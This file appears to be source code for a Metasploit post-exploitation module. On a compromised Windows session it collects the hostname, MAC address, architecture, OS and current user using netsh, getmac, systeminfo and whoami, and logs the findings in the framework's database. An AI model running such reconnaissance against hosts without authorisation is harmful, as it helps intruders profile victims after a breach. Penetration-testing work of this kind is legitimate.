# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework

class MetasploitModule < Msf::Post
  include Msf::Post::Windows::System
  include Msf::Post::Windows::Powershell

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => 'Get the sessions current user',
        'Description' => %q{
          Collects as much basic information on the current session as possible.
          Metherpreter sessions may do (most) of these functions automatically,
          but this module allows gathering even on basic shells in case a
          meterpreter session isn't viable.
          This is meant to help recon more data on a target or correct data assumed
          from external scans.
        },
        'License' => MSF_LICENSE,
        'Author' => ['Nick Cottrell <ncottrellweb[at]gmail.com>'],
        'Platform' => 'windows',
        'Privileged' => false,
        'SessionTypes' => %w[meterpreter shell powershell],
        'Notes' => {
          'Stability' => [CRASH_SAFE],
          'Reliability' => [REPEATABLE_SESSION],
          'SideEffects' => []
        }
      )
    )
    register_options([
      OptBool.new('RECON_HOSTNAME', [false, 'Report current sessions true hostname', true]),
      OptBool.new('RECON_ADDRESS', [false, 'Reports true address mac and interface', true]),
      OptBool.new('RECON_ARCH', [false, 'Reports systems true architecture', true]),
      OptBool.new('RECON_OS', [false, 'Reports true data on OS', true]),
      OptBool.new('RECON_SESSION_USER', [false, 'Reports the current user used for given session', true])
    ])
  end

  def run
    if datastore['RECON_HOSTNAME']
      print_good("Hostname is #{get_hostname}")
    end
    if datastore['RECON_ADDRESS']
      interface = nil
      mac = nil
      if session.type == 'meterpreter'
        session.net.config.each_interface do |iface|
          if iface.addrs.include?(session.session_host)
            interface = iface.mac_name.strip
            mac = iface.mac_addr.unpack('H*').first.gsub(/([\da-f]{2})/, '\1:').delete_suffix(':')
          end
        end
      end
      if interface.blank? || mac.blank?
        if session.type == 'powershell'
          # If we have powershell, then we do all of our work in powershell
          interface = cmd_exec("(Get-NetAdapter|Where-Object{$_.Name -eq (Get-NetIPAddress|Where-Object{$_.IPAddress -eq '#{session.session_host}'}).InterfaceAlias}).InterfaceDescription").strip
          mac = cmd_exec("(Get-NetAdapter|Where-Object{$_.Name -eq (Get-NetIPAddress|Where-Object{$_.IPAddress -eq '#{session.session_host}'}).InterfaceAlias}).MacAddress").gsub('-', ':').strip
        # elsif have_powershell?
        #   interface = psh_exec("(Get-NetAdapter|Where-Object{$_.Name -eq (Get-NetIPAddress|Where-Object{$_.IPAddress -eq '#{session.session_host}'}).InterfaceAlias}).InterfaceDescription")
        #   mac = psh_exec("(Get-NetAdapter|Where-Object{$_.Name -eq (Get-NetIPAddress|Where-Object{$_.IPAddress -eq '#{session.session_host}'}).InterfaceAlias}).MacAddress").gsub('-', ':')
        else
          # Since theres no powershell, attempt to claim it using netsh
          interface = cmd_exec('netsh interface ip show ipaddresses').scan(/Interface \d+: ([^\r\n]+)\r\n\r\nAddr Type  DAD State   Valid Life Pref. Life Address\r\n---------  ----------- ---------- ---------- ------------------------\r\n\S+\s+\S+\s+\S+\s+\S+\s+(\d{,3}\.\d{,3}\.\d{,3}\.\d{,3})\r\n/)

          # if the interface query gave anything, then check which one pertains to our IP address
          interface = interface.find { |x| x[1] == session.session_host }[0] if interface.any?

          if !interface.empty?
            # Now that we have our interface time to get our mac address
            mac_list = CSV.parse(cmd_exec('getmac /v /fo csv'))
            mac = mac_list.find { |row| row[0] == interface }[2].gsub('-', ':')
          end
        end
      end
      print_good("The session is running on address #{session.session_host} (#{mac}) on interface #{interface}")
      report_host(host: session.session_host, mac: mac) if active_db? && !mac.blank?
    end
    if datastore['RECON_ARCH']
      if session.type == 'meterpreter'
        host_arch = sysinfo['Architecture']
      elsif session.type == 'powershell'
        host_arch = case cmd_exec('(Get-ComputerInfo).OSArchitecture').strip
                    when '64-bit'
                      'x64'
                    when '32-bit'
                      'x32'
                    end
      else
        host_arch = case cmd_exec('echo %PROCESSOR_ARCHITECTURE%').strip
                    when /amd64/i || /x64/i
                      'x64'
                    else
                      'x32'
                    end
      end
      print_good("The hosts architecture is #{host_arch}")
      report_host(host: session.session_host, arch: host_arch) if active_db?
    end
    if datastore['RECON_OS']
      case session.type
      when 'meterpreter'
        host_os = sysinfo['OS']
      when 'powershell'
        host_os = cmd_exec('"$((Get-ComputerInfo).WindowsProductName) ($((Get-ComputerInfo).OSVersion))"').strip
      else
        host_data = cmd_exec('systeminfo')
        host_os_name = host_data[/^OS Name:\s+.+$/].gsub(/^OS Name:\s+/, '').strip
        host_os_build = host_data[/^OS Version:\s+.+$/].gsub(/^OS Version:\s+/, '').strip
        host_os = "#{host_os_name} (#{host_os_build})"
      end
      print_good("The host is running #{host_os}")
      report_host(host: session.session_host, os_name: host_os) if active_db?
    end
    if datastore['RECON_SESSION_USER']
      username = cmd_exec('whoami.exe')
      credential_data = {
        workspace_id: myworkspace_id,
        session_id: session_db_id,
        address: session.session_host,
        origin_type: :session,
        post_reference_name: refname,
        username: username
      }
      print_good("The user running on the session is #{username}")
      create_credential(credential_data) if active_db?
    end
  end
end
